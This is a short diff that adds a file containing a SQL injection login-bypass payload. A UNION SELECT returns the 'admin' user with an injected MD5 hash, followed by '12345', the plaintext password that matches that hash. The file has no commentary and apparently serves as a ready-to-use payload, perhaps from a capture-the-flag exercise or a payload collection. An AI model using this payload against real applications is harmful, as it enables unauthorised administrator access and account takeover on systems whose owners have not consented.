@@ -1,0 +1,3 @@
+' union select userid,username,'827ccb0eea8a706c4c34a16891f84e7b' as password from users where username = 'admin
+
+12345
